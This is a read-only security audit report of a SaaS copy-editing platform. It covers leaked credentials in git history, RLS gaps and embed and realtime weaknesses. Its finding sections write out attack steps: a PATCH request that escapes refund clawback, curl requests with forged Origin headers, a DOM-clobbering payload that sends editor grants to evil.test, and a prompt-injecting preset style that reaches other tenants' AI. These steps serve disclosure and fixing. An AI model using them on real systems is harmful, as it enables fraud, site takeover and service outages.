# Security audit — October 2026

**Date:** 2026-10-27
**Audited code:** `origin/main` at `534e7926` (s124). Local `main` was 32 commits behind, so the
audit read a detached checkout of `origin/main`, not the working tree.
**Type:** defensive, read-only. Code reading across every outside-reachable surface, local
`npm audit`, git-history secret scan, GitHub secret-scanning alert metadata, and safe read-only
probes of production (`GET`/`OPTIONS`/headers only — no writes, no credentials used, no load).
**Nothing was changed** in code, configuration or data. Fixes go through the killer-saas pipeline
(story → plan → execute → review → PR) per `AGENTS.md`.

## Summary

| Severity | Count | Headline |
|---|---|---|
| CRITICAL | 1 | Production credentials still readable in the public repo's git history; rotation unconfirmed |
| HIGH | 4 | Credit-purchase rows user-editable · content injection via public site token · embed `currentScript` clobbering · realtime DB amplification |
| MEDIUM | 9 | Cross-tenant "preset" style · audit-log forgery · webhook DNS-rebinding SSRF · unmetered AI on styles/apply · image upload on public token · realtime pre-auth socket exhaustion · editor-code guessing budget · scarce-offer draining · Sentry scrub gaps |
| LOW | 20+ | Listed at the end |

The core tenant boundary holds. All 67 public tables have RLS. No route was found that lets
user A read or write user B's site through a changed id. The Stripe money path holds: signature
on the raw body, idempotent events, server-side prices, env-built return URLs. The s79, s84 and
s89 fixes hold (detail under [Earlier fixes re-verified](#earlier-fixes-re-verified)).

Most of the risk sits in two places:

1. **Secrets published before August 2026 that may still be live.** This is an operator action,
   not code.
2. **The site token.** It is public by design, but several write paths treat it as authorisation.
   The Origin pin only stops browsers; `curl` sends any `Origin` it likes.

---

## Entry-point inventory

"Site token" = the HMAC `data-site-token` in every customer's page source; public by design.
"Origin pin" = the `Origin`/`Referer` must match `sites.domain`. That stops browsers, not scripts.

### Next.js app — `www.recopyfa.st` (Vercel)

| Door | Auth required | Who can reach it | Main risks |
|---|---|---|---|
| Marketing pages, `/blog`, `/compare`, `/guides`, `/tools/*` | none | anyone | static CSP keeps `'unsafe-inline'` (L) |
| `/dashboard*`, `/settings*` (middleware gate) | Supabase session | signed-in users | client shell; data comes from APIs that each call `getUser()` |
| `/login`, `/signup`, `/auth/callback`, `/auth/confirm` | OTP / PKCE / `token_hash` | anyone | open redirect (none found), sign-up abuse (M8) |
| `/edit` hub + `/api/editor/sites`, `sign-out`, `handoff/create` | hub cookie (HMAC, httpOnly, Lax) | invited editors | sign-out revokes nothing server-side (L) |
| `/api/editor/request-code`, `submit-code` | emailed 6-digit code | anyone, CORS `*` | guessing budget and mail-bombing (M7) |
| `/api/editor/validate-grant`, `refresh-grant`, `handoff/redeem` | device grant or one-time code + Origin + UA | anyone, CORS `*` | Origin/UA forgeable by non-browser (L) |
| `/api/editor/editors` | session + site admin | owners | revocation sweep can silently fail (L) |
| `/api/edit-sessions/create`, `active`, `revoke` | session | owners | tokens stored and listed in plaintext (L) |
| `/api/edit-sessions/validate`, `extend`, `/api/staging/validate`, `verify` | edit / staging token or edit-link code | anyone, CORS `*` | tokens in query strings (L) |
| `/api/staging/access`, `/api/staging/publish`, `/api/staging/content/[siteId]` | session + admin, or staging token | owners, editors | holds |
| `GET /api/content/[siteId]` | site token + Origin pin, or session | anyone with the token | public by design |
| `POST /api/content/[siteId]` (discovery) | **site token + Origin pin only** | **anyone** | **content injection (H2)** |
| `GET /api/published/[siteId]` | none | public | public snapshot by design |
| `POST /api/upload/image` | **site token + Origin pin only** | **anyone** | **storage abuse (M5)** |
| `/api/ab-tests/active`, `bucket`, `track` | site token + Origin pin | anyone | forged A/B outcomes (L) |
| `/api/ab-tests`, `results`, `generate` | session + edit + plan | editors | unbounded prompt (L) |
| `/api/analytics/track`, `performance` POST | site token or session | anyone with the token | fake telemetry (accepted) |
| `/api/analytics/export`, `track` GET, `performance` GET, `context` | session + permission, or consent cookie | members | holds; export guards CSV formulas |
| `/api/sites`, `sites/register`, `sites/[siteId]/*` | session + admin row | owners | domain squatting, raw `api_key` returned (L) |
| `/api/content/changes*`, `/api/bulk/*` | session + permission (+ `checkOwnerCanEdit` on writes) | members | CSV formula injection in bulk export (L) |
| `/api/api-keys`, `/api/v1/content` | session + admin / API key | owners, key holders | `metadata` unvalidated on v1 (L) |
| `/api/edit-board/*` | session or staging token, site-scoped | editors | **styles/apply unmetered AI, cross-site style (M4)**; preset injection (M1) |
| `/api/teams/*`, `teams/invitations/accept` | session + team role | members | invite visibility trusts JWT email (L) |
| `/api/webhooks`, `webhooks/test`, `webhooks/deliveries` | session + edit/admin | editors | **DNS-rebinding SSRF, body returned (M3)** |
| `/api/domains/verify` | session + admin | admins | blind SSRF only; holds |
| `POST /api/tools/scan` | none (IP, /48, global, per-target caps) | public | holds (pinned DNS) |
| `/api/ai/suggest`, `ai/translate` | editor credential / session + credits | editors | holds |
| `GET /api/audit/logs`, `audit/compliance` | session | users / admins | consume forged rows (M2) |
| `POST /api/audit/logs` | **none** | **anyone** | **log forgery via service role (M2)** |
| `/api/security/events`, `stats` | session + admin | admins | POST disabled; holds |
| `/api/notifications`, `/api/auth/*` | session | self | `logout` echoes raw Supabase error (L) |
| `POST /api/webhooks/stripe` | Stripe HMAC on raw body | anyone (fails closed) | half-processed retry runs unclaimed (L) |
| `/api/billing/*` | session, keyed on `user.id` | signed-in users | holds; `credits?limit=` unbounded (L) |
| `/api/offers/founding`, `/api/pricing` | none (IP limit) | public | information only |
| `/api/cron/*` (6 routes) | `Bearer CRON_SECRET`, constant-time, fails closed | Vercel cron | depends on C1 rotation |
| `/api/blog/generate`, `/api/admin/blog/*` | same-origin + session + platform admin | admin | holds (s89) |
| `/api/health`, `/api/health/ready` | none, rate-limited | public | statuses and latencies only |
| `POST /monitoring` (Sentry tunnel) | envelope must name our DSN | public | holds (s84); quota noise only |

### Embed — `/embed/recopyfast.js` on customer domains

| Door | Auth required | Who can reach it | Main risks |
|---|---|---|---|
| Widget boot config: `document.currentScript` `data-*` and `window.RECOPYFAST_*` | none | host markup, including CMS/UGC HTML | **clobbering redirects API/WS and credentials (H3)** |
| `/embed/recopyfast-secure.js` legacy loader | none | same | **loads `currentScript.src` as a script (H3)** |
| URL inputs `#rcf_edit=`, `?rcf_handoff=`, `?rcf_staging=1&rcf_token=` | the code or token | anyone with the link | share-link token reaches host logs (L) |
| Editor credentials in `sessionStorage` / `localStorage` | n/a | any script on the host page | accepted residual (ADR 036) |
| `postMessage` | n/a | n/a | none exists |

### Realtime — `wss://recopyfast-ws.fly.dev` (Fly, one machine)

| Door | Auth required | Who can reach it | Main risks |
|---|---|---|---|
| Engine.IO upgrade, before CONNECT | none | anyone | **pre-auth connection exhaustion (M6)** |
| Socket.io CONNECT | site token + Origin pin; staging needs a grant | anyone with the token | per-site bucket lockout (L) |
| `content-map` event | handshake token | every socket, visitors included | **one Supabase read per message (H4)** |
| `content-update`, `join-dashboard` | live staging/edit grant, re-checked per message | editors | holds |
| `GET /health` | none | anyone | `{status:"ok"}` only |

### Data plane — Supabase `uexwowziiigweobgpmtk`

| Door | Auth required | Who can reach it | Main risks |
|---|---|---|---|
| PostgREST with the publishable key | RLS | anyone | `credit_purchases` (H1), `copy_styles` (M1), defaults still grant ALL to anon (L) |
| PostgREST with a user JWT | RLS | any signed-up user | same |
| Storage bucket `assets` | public read; uploads service-role only | anyone | holds |
| Legacy `service_role` JWT from git history | none | **anyone who read the repo** | **full bypass if still valid (C1)** |

---

## Findings

Severity follows `.claude/rules` code-review levels: CRITICAL = exploitable now with severe
impact; HIGH = real bug with security impact; MEDIUM = abuse, availability or integrity issue
with preconditions; LOW = defence in depth.

### CRITICAL

#### C1. Live-format production credentials in public git history — rotation unconfirmed

**Evidence**

- `1e620acb` (2025-08-22) and `216d10e9` (2025-08-17) committed these:
  - a Supabase **`service_role` JWT** for the production project. Payload:
    `{"ref":"uexwowziiigweobgpmtk","role":"service_role","exp":2070634599}`, valid to 2035.
    It was in `setup-credit-system.js`.
  - the Stripe webhook signing secret (`PRODUCTION_DEPLOYMENT_CHECKLIST.md`).
  - a Redis Cloud URL with password (`.mcp.json`, checklist).
  - the CRON_SECRET (checklist).
  - per `docs/stories.md:3476`, a Supabase personal access token and the Postgres password
    (`.mcp.json`, `supabase/.temp/pooler-url`).
- `80e79538` and `eb5e9433` removed them from the tree. Both commit messages say the values
  "must be treated as compromised and rotated". Removal does not unpublish history, and the repo
  is **public**.
- GitHub secret scanning has **4 alerts still open**: #1, #3 and #4 are "Stripe Webhook Signing
  Secret"; #2 is "Supabase Service Key". All have resolution `null` and validity `unknown`.
- The owner checklist in `docs/stories.md:3478-3486` (s68, precondition C1) is still **unticked**:
  service-role key rotated, PAT revoked, Postgres password reset, Redis rotated.
- Production now ships a `sb_publishable_…` key, so the project uses Supabase's new API keys.
  That does **not** retire the legacy JWT keys. They keep working until they are explicitly
  disabled, or until the JWT secret is rotated.

**What I could not verify:** whether any value is still valid. Testing that would mean using a
leaked credential against production, which this audit does not do. I was also not permitted to
read local `.env` files to compare key formats.

**Attack:** anyone who cloned or mirrored the repo uses the leaked `service_role` JWT against
`https://uexwowziiigweobgpmtk.supabase.co/rest/v1/`. RLS is bypassed: they can read every user,
site and token table, write any row, and grant any plan or credits. A live CRON_SECRET opens the
cron routes. A live Postgres password is direct database access.

**Fix:** owner actions, in this order. No code is needed.

1. **Supabase → Settings → API Keys:**
   - confirm Vercel and Fly use `sb_secret_…`, not the JWT `service_role` key;
   - then **disable the legacy JWT-based API keys**, or rotate the legacy JWT secret if anything
     still needs them;
   - check that a request with the old JWT gets 401.
2. Revoke every Supabase personal access token created before 2026-08.
3. Reset the database password and update pooler strings wherever they are stored
   (`docs/operations/backups.md` § "Rotating the database password").
4. Rotate CRON_SECRET in Vercel. Vercel cron sends the new value automatically.
5. Roll the Stripe webhook signing secret (`docs/operations/stripe-setup.md` §rotation) and
   confirm alerts #1/#3/#4 refer to rolled values. #4 (2026-08-17) may be the mock in
   `docs/designs/s16-webhook-config.html:607`; if so, close it as a false positive.
6. Delete the Redis Cloud database if it is no longer used (the app now uses Upstash), or
   rotate its password.
7. Tick the `docs/stories.md` s68 checklist and close the GitHub alerts as "revoked".
8. Turn on GitHub **secret-scanning validity checks** (currently disabled) so GitHub reports
   whether a leaked key is still live.
9. Optional: rewrite history with `git filter-repo`. Rotation is the actual fix; a rewrite only
   limits further copying.

### HIGH

#### H1. A buyer can rewrite their own `credit_purchases` row and escape refund/chargeback clawback

- [x] **Status:** fixed in s125 (PR #127, merged), ADR 075.

**Evidence**

- `supabase/migrations/20260731003000_missing_tables_billing_credits.sql:101-107` — the update
  policy is ``FOR UPDATE TO authenticated USING (user_id = auth.uid()) WITH CHECK (user_id = auth.uid())``.
- The only guard is the trigger at `:109-118`. It refuses just
  `NEW.credits_remaining > OLD.credits_remaining`.
- No later migration narrows the column grants: `grep credit_purchases supabase/migrations` shows
  no `REVOKE` or column `GRANT`.
- Refunds and disputes find the row through the payment-intent id:
  `src/lib/credits/system.ts:584` `.eq("stripe_payment_intent_id", …)`. With no match they revoke
  nothing.

**Attack:**

1. Buy a credit pack.
2. With your own session and the publishable key, send
   `PATCH /rest/v1/credit_purchases?id=eq.<own row>` with `{"stripe_payment_intent_id":"x"}`.
3. Refund or charge back. The webhook finds no row, so the user keeps both the money and the
   credits.

The same request can also rewrite `price_cents` and `credits_purchased`, which are GA4 revenue
evidence.

**Fix (migration):**

```sql
REVOKE UPDATE ON public.credit_purchases FROM PUBLIC, anon, authenticated;
GRANT UPDATE (credits_remaining) ON public.credit_purchases TO authenticated;
```

Also extend the trigger to refuse a change to any other column from a non-service role, and add
the table to the s38 column-grant invariant test.

To confirm on production (read-only):
`select has_column_privilege('authenticated','public.credit_purchases','stripe_payment_intent_id','UPDATE');`

#### H2. Anyone can plant published copy on a customer's not-yet-discovered page

**Evidence**

- Discovery inserts rows with `published_content` already set to the caller's text:
  `src/app/api/content/[siteId]/route.ts:177`
  (`published_content: element.value.content`). The upsert at `:670-674` uses
  `ignoreDuplicates: true`, so the first writer wins and later legitimate discovery is ignored.
- The only authorisation is `authorizeSiteRequest`: the public site token plus
  `requestOriginHost !== allowedDomain` (`src/lib/security/site-auth.ts:242`). Both inputs are
  supplied by the caller; `curl -H "Origin: https://customer.com"` passes.
- Element ids are deterministic: `'rcf-' + hashPath(path + structuralPath)`
  (`public/embed/recopyfast.src.js:939-947`). The caller also chooses `page_path` and the
  `href`/`alt` metadata.

**Attack:**

1. Read the token from the customer's page source.
2. Fetch a page no widget visitor has loaded yet: a new page, a fresh install, or markup changed
   after a redesign.
3. Compute its element ids and POST attacker text and `https://` links.
4. The first real visitor's widget applies them. The page is defaced, or links point to a
   phishing site.
5. The copy persists until the owner edits that element.

Script injection is not possible: the widget writes `nodeValue` and allow-lists href schemes.

**Fix:** discovery must never publish. Insert with `published_content = NULL`; the serving path
already falls back to the host's own markup. Only an editor publish (which already requires an
editor credential plus `checkOwnerCanEdit`) sets it. Add a regression test where a token-only
POST for a new element leaves the served copy unchanged.

#### H3. Embed trusts a clobberable `document.currentScript`, which redirects credentials and, through the legacy loader, script source

**Evidence**

- `public/embed/recopyfast.src.js:38` — `const SCRIPT = document.currentScript;`
- `:40` takes `SCRIPT_ORIGIN` from `SCRIPT.src`.
- `:46` returns `SCRIPT.getAttribute(attribute)` for `data-api-url` and `data-ws-url`.
- `:69-70` take the site id and token from it too.
- `public/embed/recopyfast-secure.js:4-10` sets `script.src` from `current.src`.
- `Document` is `[LegacyOverrideBuiltIns]`, so markup like
  `<img name="currentScript" src="https://evil.test/x" data-api-url="https://evil.test/api">`
  shadows the real property. This is the gadget behind webpack CVE-2024-43788. It also defeats
  the M8 same-origin check, because that check is anchored on `SCRIPT.src`.

**Precondition:** the attacker can get name-bearing HTML onto the customer's page, for example a
CMS comment, profile or post that sanitizers commonly allow. The snippet sits before `</body>`,
so earlier content wins.

**Attack:** the widget sends these to `evil.test`:

- `X-RCF-Editor-Grant` headers;
- the `#rcf_edit` code (via `/staging/validate`);
- the `?rcf_handoff` code.

The codes are not spent, so the attacker redeems them at the real API within 60 s with a forged
Origin, and gets edit/publish rights over the whole site. Through `recopyfast-secure.js`, the
attacker's URL is loaded as a script on the customer's origin.

**Fix:**

```js
const SCRIPT = Object.getOwnPropertyDescriptor(Document.prototype, 'currentScript').get.call(document);
if (!(SCRIPT instanceof HTMLScriptElement)) return;
```

Apply the same in `recopyfast-secure.js`, or replace that loader with a constant
`https://www.recopyfa.st/embed/recopyfast.js` (its URL must stay live). Add an embed test that
plants `<img name="currentScript">`. Rebuild the artifact with `scripts/build-embed.mjs`.

#### H4. Any site-token holder can drive ~2,400 Supabase reads per second through realtime `content-map`

**Evidence**

- `server/index.js:531-557` handles `content-map` for every socket, visitors included.
- `:548` calls `revalidateSocket` for each message, and that runs a service-role `sites` SELECT
  (`:194-198`).
- The message limiter is per socket (`server/rate-limit.js:365-366`, 600/min). Sockets are bounded
  only by handshake rate and Fly `hard_limit = 250` (`server/fly.toml:117`).
- No production client consumes `content-map-updated`.

**Attack:**

1. Use a public token and a forged Origin.
2. Open ~240 sockets over a few minutes.
3. Emit `content-map` 600×/min on each.

That is ~2,400 SELECTs per second (plus as many Redis INCRs) against the Supabase project shared
with the Next.js app. The HTTP product degrades, which breaks ADR 004's promise that realtime is
additive.

This is a code-path analysis; it was not load-tested.

**Fix:** in `content-map`, return early unless `socket.data.isStaging`. Memoise revalidation for
about 10 s per socket. Add a tight per-socket `content-map` budget (for example 5/min) and a
per-site message budget alongside the per-socket one.

### MEDIUM

#### M1. Any customer can publish a "preset" copy style every tenant sees (cross-tenant prompt injection)

- [x] **Status:** fixed in s125 (PR #127, merged), ADR 075.

**Evidence**

- `supabase/migrations/20251230100000_edit_board.sql:180-189` — the INSERT check never
  constrains `is_preset`.
- `:166-167` — `"Anyone can view preset styles" … USING (is_preset = true)`.
- `src/app/api/edit-board/styles/route.ts:109-113` lists presets with `.eq("is_preset", true)` and
  no `site_id IS NULL` filter.
- `styles/apply/route.ts:158-162` loads a style by id alone and sends its prompt to the AI.

**Attack:**

1. Sign up and create a site.
2. Run `supabase.from('copy_styles').insert({site_id: mine, name:'SEO Boost', prompt:'…', is_preset:true})`.
3. The style appears in every tenant's Edit Board. Applying it stages attacker-steered AI copy
   into the victim's content.

**Fix:** recreate the INSERT/UPDATE policies with `AND is_preset = false`. Add
`CHECK (is_preset = (site_id IS NULL)) NOT VALID`. Revoke table writes from `authenticated` (the
routes already write through the service role). In code, filter presets with
`.is("site_id", null)`, and in `apply` require `style.site_id = siteId OR style.site_id IS NULL`.

#### M2. Unauthenticated audit-log forgery through the service role

**Evidence**

- `src/app/api/audit/logs/route.ts:87-131` — POST requires only `action` and `resourceType`.
- `user` may be null (`userId: user?.id`).
- There is no limiter and no size or enum limit.
- `auditLogger` writes with the service-role key (`src/lib/audit/logger.ts:14-16`).
- `audit/compliance` reads a global page of 10,000 rows and filters on `metadata.site_id`
  in memory.

**Attack:** loop
`POST {action:"security_breach",resourceType:"site",metadata:{site_id:<victim>}}`. The victim's
compliance reports fill with fake events, real events fall out of the read window, and the table
grows without bound.

**Fix:** delete client-side POST, as `security/events` already does, or require a session with
an allow-listed `action`/`resourceType`, a capped `metadata`, and a fail-closed limiter. Query
compliance by site in SQL.

#### M3. Webhook delivery SSRF via DNS rebinding, with the response readable

**Evidence**

- `src/lib/webhooks/manager.ts:464` runs `assertSafeWebhookUrl`, which resolves DNS.
- `:474` then calls the global `fetch(url)`, which resolves again.
- `:502` stores `responseBody.substring(0, 1000)`; `GET /api/webhooks/deliveries` returns it.
- `testWebhook` (`:831`) allows on-demand retries.
- `src/lib/security/webhook-url-safety.ts` itself says it "narrows the rebinding window rather
  than closing it".
- The fix already exists: `src/lib/tools/fetch/validating-lookup.ts`, used by `tools/scan`.

**Attack:** an edit-level member points a webhook at a TTL-0 name that alternates between a
public IP and `127.0.0.1` or `10.x`, then presses Test until the connect lands internally. The
first 1 KB of the internal response shows up in the delivery log. Impact on Vercel is bounded
(there is no IMDS); the code path is confirmed.

**Fix:** route delivery, test and `domain-verification.ts:200` through `safe-fetch` with
`createValidatingLookup()` as the connect-time lookup. Store only status codes for failures.
Optionally restrict webhook management to `admin`.

#### M4. `edit-board/styles/apply` spends AI with no meter, and can read another site's style

**Evidence**

- `src/app/api/edit-board/styles/apply/route.ts:196-205` makes one OpenAI call per element.
- There is no `consumeFeatureUsage` or credit charge.
- `elementIds` is optional, so omitting it means every element on the site.
- `previewOnly` spends without writing anything.
- The limit is 50 requests a minute.
- The style lookup at `:161` is not scoped to the site.

**Attack:** a staging editor, or an owner with no AI plan, triggers ~50 × N OpenAI calls per
minute on RecopyFast's bill, and can apply another tenant's private style prompt by UUID.

**Fix:** charge through `consumeFeatureUsage` as `ai/suggest` does, cap the element count (for
example 50), and scope the style to `is_preset OR site_id = siteId`.

#### M5. Image upload is authorised by the public site token only

**Evidence:**

- `src/app/api/upload/image/route.ts:125-130` calls `authorizeSiteRequest` only.
- There is no editor credential and no `checkOwnerCanEdit`.
- The embed sends `Authorization: Bearer SITE_TOKEN` (`recopyfast.src.js:2973-2974`).

**Attack:** curl with a forged Origin stores 10 images of up to 4 MB per minute per site — about
57 GB a day per site. They land in a public bucket under RecopyFast's storage origin, attributed
to the customer. RecopyFast pays for the storage and egress, and abusive imagery can be hosted
there.

**Fix:** require `validateEditorTokenFromRequest` with `edit` permission and `checkOwnerCanEdit`,
as `ai/suggest` does. Send `editorAuthHeaders()` from `uploadImage`.

#### M6. Realtime: one machine, no pre-auth connection cap, refused sockets stay open

**Evidence**

- The `new Server(...)` options at `server/index.js:121-147` set no `connectTimeout` (default
  45 s), no `maxHttpBufferSize` (default 1 MB) and no `allowRequest`.
- `refuse()` calls `socket.disconnect()` without `true` (`:184`), so the Engine.IO transport stays
  open.
- `hard_limit = 250` on one `shared-cpu-1x` (`server/fly.toml:117`).

**Attack:** hold 250 raw `wss://…/socket.io/?EIO=4&transport=websocket` connections that never
send CONNECT, and reopen them every 45 s. No credential is needed and no application limiter
runs. Co-editing is down for every tenant.

**Fix:** set `connectTimeout: 5000` and `maxHttpBufferSize: 64 * 1024`, add an `allowRequest`
concurrent cap per IP, and use `socket.disconnect(true)` in `refuse()`.

#### M7. Editor 6-digit code: no long-horizon guessing cap; budgets multiply per scope

**Evidence**

- `src/lib/auth/editor-request.ts:164-171` keys the limiter on `${email}|${scope}`.
- The limit is `API_AUTH` 5 per 15 minutes, a fixed window (`src/lib/security/rate-limiter.ts:456`).
- A new code can be requested 3 times per 5 minutes.
- The per-IP limit falls to IP rotation.

**Attack:**

- 480 guesses a day per scope. The hub scope can mint hand-offs to every site the editor has.
- That is about a 16% success chance per year per scope, while sending the victim around 96 code
  emails a day.

**Fix:** a per-email limit that ignores scope (for example 20 failed submits per 24 h, then
exponential lock-out), a per-email daily send cap (10/day), and an alert when the lock-out trips.

#### M8. Scarce offers can be drained with free, card-less accounts

**Evidence**

- OTP sign-up triggers `ensureTrialStarted` → `claimFoundingOfferSpot` (`src/lib/billing/trial.ts:159`).
- The cap is 20 (`20260928120000_founding_offer.sql:209`); prod shows 19 left.
- Lifetime Agency holds a spot for 30 minutes per checkout
  (`20260924065000_agency_plan_and_founding_capacity.sql:97,198`), cap 50.
- The only brake is per user (`CHECKOUT_USER`). There is no CAPTCHA or disposable-email screen.

**Attack:**

- 20 throwaway emails take every founding Pro trial. Each also draws 90 days of AI credits.
- 50 accounts re-reserve lifetime-agency checkout every 30 minutes, so real buyers see
  "capacity busy".

**Fix:**

- Put Turnstile or a disposable-domain check on sign-up before a founding claim.
- Tie founding claims to a verified signal, such as a card on file or account age.
- Add a cool-down so an account that let a hold lapse cannot reserve again at once.
- Add a per-IP/ASN reservation limit.

#### M9. Next.js Sentry scrubbing is weaker than the s84 realtime scrubber

**Evidence**

- `sentry.server.config.ts:69-71` deletes only `authorization`, `cookie` and `x-supabase-auth`.
  It keeps `x-api-key` and `x-site-token`.
- `:75-79` drop a query param only if its raw text contains `token`/`key`. That misses
  percent-encoded names and `code=`.
- `sentry.edge.config.ts:52` does no scrubbing at all.
- `onRequestError = Sentry.captureRequestError` attaches request data to every thrown route error.

**Impact:** a v1 API error ships a customer's live `x-api-key` to Sentry.

**Fix:** move `server/sentry.js`'s decoded-name scrubber into a shared module. Use it in
server, edge and realtime, and make body redaction recursive.

### LOW

| # | Finding | Evidence | Fix |
|---|---|---|---|
| L1 | A/B results forgeable with the site token; can auto-complete a test with a chosen winner | `src/app/api/ab-tests/track/route.ts:516`, `src/lib/ab-testing/lifecycle.ts:127` | require distinct-visitor minimums, or manual completion |
| L2 | Re-inviting a removed editor can revive grants that escaped a failed or raced revocation sweep | `src/lib/auth/editor-directory.ts:342`; `20260924000000_atomic_editor_activation.sql:64-68` | revoke all device grants in `activate_site_editor`; report sweep failure |
| L3 | No server-side editor sign-out; stateless 7-day hub session | `src/app/api/editor/sign-out/route.ts:53-56`; `revokeGrantById` has no caller | per-email hub epoch + `POST /api/editor/revoke-grant` |
| L4 | `submit-code` timing distinguishes a known editor email | `src/lib/auth/editor-verification.ts:200-223` | constant-cost rejection |
| L5 | Edit-session and staging tokens stored in plaintext; `/edit-sessions/active` lists them | `src/lib/auth/edit-sessions.ts:100-104,186-205`; `staging-access.ts:186-191` | store SHA-256, look up by hash |
| L6 | Middleware auth-route redirect drops refreshed Supabase cookies; redirects skip security headers | `src/middleware.ts` (`isAuthRoute && user` branch) | copy cookies and headers onto every redirect |
| L7 | Bearer tokens in URLs: `?rcf_edit_token`, socket `query`, share-link `?rcf_token` | `public/embed/recopyfast.src.js:1371,3117-3124,74-75` | header / socket `auth`; fragment one-time code for share links |
| L8 | One-time codes are Origin-bound only; a URL-capturing host script can race the widget | `src/lib/auth/edit-link-redeem.ts:73-78` | bind a UA hash into the signed payload |
| L9 | Direct admin writes skip the plan gate on `site_themes`, `site_languages`, `staging_access`, `site_editors`, `domain_verifications` | `20251230100000_edit_board.sql:240-310` and others | ADR 042 pattern: service role + `checkOwnerCanEdit` |
| L10 | `WITH CHECK` checks only the user on `bulk_operations`, `collaboration_sessions`, `content_editing_sessions`, so rows can be pointed at another tenant's site | `20260818000000:1112,731`; `20260801200000:734` | add site membership to `WITH CHECK` |
| L11 | Admin can clear `revoked_at` on `editor_device_grants` | `20260925120000:137-139` | `WITH CHECK (revoked_at IS NOT NULL)` |
| L12 | Team invitation visibility trusts the JWT email | `20260801200000:941-946` | confirm prod requires email confirmation, or check `email_verified` |
| L13 | Table defaults still grant ALL to anon/authenticated; RLS is the only layer | only function defaults revoked (`20260809120000:213`) | `ALTER DEFAULT PRIVILEGES … REVOKE ALL ON TABLES`; CI invariant |
| L14 | Domain squatting: first registrant locks a domain without proof | `src/app/api/sites/register/route.ts:109-121` | let a verified owner supersede an unverified claim |
| L15 | Raw site HMAC key returned to the browser on register | `src/app/api/sites/register/route.ts:212` | drop `apiKey` from the response |
| L16 | CSV formula injection in bulk export | `src/lib/bulk/csv.ts:21-25` | prefix `'` on `= + - @ \t \r` |
| L17 | `ab-tests/generate` takes unbounded `original_text` | `src/app/api/ab-tests/generate/route.ts:54,163` | `maxLength: 5000`; integer `num_variants` 1–5 |
| L18 | `edit-board/history/[versionId]` charges the per-site limiter before authz | `route.ts:124,215` vs `:129` | authorise first |
| L19 | Webhook HMAC has no timestamp, so deliveries can be replayed | `src/lib/webhooks/manager.ts:735` | sign `timestamp.body`; send a timestamp header |
| L20 | `v1/content` writes `metadata` unvalidated (bypasses `validateContentAttributePatch`) | `src/app/api/v1/content/route.ts:298,322` | validate as the session path does |
| L21 | Realtime per-site handshake bucket can be exhausted by a forged-Origin client | `server/index.js:373-380,417` | spend the per-site bucket only after the grant resolves |
| L22 | One throw in a realtime handler exits the process | `server/index.js:501-515,828-831` | try/catch in `onMessage` |
| L23 | Realtime holds the full service-role key but needs 5 SELECTs | `server/index.js:893-896` | dedicated read-only role |
| L24 | Half-processed Stripe event re-runs handlers without a claim on retry | `src/app/api/webhooks/stripe/route.ts:255` | atomic lease on `billing_events` |
| L25 | DataFast third-party script runs on `/login` and `/dashboard` (by design, ADR 073) | `src/middleware.ts:176` | keep it off auth and editor surfaces |
| L26 | Conflicting `Referrer-Policy` (`origin-when-cross-origin` in config) | `next.config.ts:127` vs `src/middleware.ts:347` | use `strict-origin-when-cross-origin` in both |
| L27 | Marketing CSP keeps `'unsafe-inline'` scripts on the same origin as the app; Supabase auth cookies are JS-readable | live header on `/`; ADR 059 accepted residual | extend the nonce CSP when practical |
| L28 | Small items: `logout` echoes the raw Supabase error; `billing/credits?limit=` is unbounded; a non-remembered hub session can request a 7-day grant; `service.ts` lacks `import "server-only"`; dead `checkout_reservations` table | `api/auth/logout/route.ts:18`; `api/editor/handoff/create/route.ts:52` | trivial fixes |

---

## Dependencies

- `npm audit --omit=dev` reports **0 vulnerabilities** in both the app and `server/`.
- The full tree, dev included, has 13 high: the `@lhci/cli` → `lighthouse` → `puppeteer`
  chain (`tmp`, `extract-zip`, `basic-ftp`, proxy agents) and a dev-only `zod <4.6.6`. They run
  only in CI and local tooling and are not shipped. Bump `@lhci/cli` when a fixed release lands.
- Dependabot security updates are on.

## Production probes (read-only)

| Probe | Result |
|---|---|
| `/.env`, `/.env.local`, `/.git/config`, `/.git/HEAD`, path traversal | 404 |
| `/dashboard` unauthenticated | 307 to `/login?redirectedFrom=…` |
| `/api/sites`, `/api/admin/blog/posts`, `/api/cron/webhook-dispatch`, `/api/audit/logs` (GET), `/api/security/stats`, `/api/v1/content` | 401 |
| `/monitoring` with a foreign envelope | 400 "Invalid tunnel request" |
| `/api/health`, `/ready` | statuses and latencies only; no error text |
| App-surface CSP (`/login`) | nonce + `'strict-dynamic'`, `frame-ancestors 'none'`, `object-src 'none'` |
| HSTS / XFO / nosniff / Permissions-Policy | present (2-year HSTS, `DENY`) |
| CORS preflight from `https://evil.example` | `/api/sites`, `/api/auth/session`: no ACAO. `/api/content/[id]`: ACAO pinned to `https://www.recopyfa.st` |
| `recopyfast-ws.fly.dev/health` | `{"status":"ok"}`, CSP `default-src 'none'`, HSTS |
| Engine.IO polling from an evil Origin | ACAO echoes the origin without credentials; polling is refused (websocket-only) |
| Public Supabase key in production JS | `sb_publishable_…`; no service key in any bundle |

## Earlier fixes re-verified

- **s79** (CSP and realtime credentials): holds.
  - Nonce CSP with `'strict-dynamic'` on `/dashboard`, `/login`, `/signup` and `/edit`, with
    segment-exact prefixes and a 128-bit nonce that overwrites any client-sent one.
  - Realtime refuses a missing Origin, re-validates per message and on a 60 s sweep, and fails
    closed on lookup errors.
- **s84** (observability): holds.
  - The tunnel matches case, trailing slash and encoding.
  - It accepts only our DSN in both the query and the envelope.
  - Health returns no error text.
  - **Gap:** the Next.js scrubber was not brought up to the realtime one (M9).
- **s89** (blog): holds.
  - `blog/generate` requires same-origin plus platform admin, and its limiters fail closed.
  - Cron writes drafts only.
  - Publishing is a guarded `draft → published` transition.
  - Admin status comes from `ADMIN_EMAILS` or `app_metadata`, never `user_metadata`.
- **s72** (Edit Board history XSS): holds. History is rendered with `textContent`.
- **s76** (grant / edit-token separation): holds. The grant travels only in a header.
- **ADR 055** (edit link as a one-time code): holds.
  - The fragment is stripped before any `await`.
  - The code is spent once and atomically.
  - It never reaches a Referer.
- **ADR 033/034** (column boundary): holds for `sites.api_key`, `webhooks.secret`,
  `api_keys.key_hash` and the grant hashes. `credit_purchases` was never brought under it (H1).

## Recommended order

1. **C1, today.** Owner-only: disable the legacy Supabase JWT keys, rotate the remaining
   secrets, and close the GitHub alerts. No code.
2. **H1 + M1 together.** One migration closes two column/policy holes, and it is cheap to test
   with the existing grant-invariant suite.
3. **H2 + M5.** Close the site-token write paths: discovery never publishes, and upload requires
   an editor credential.
4. **H3.** Embed `currentScript` hardening and retirement of the legacy loader.
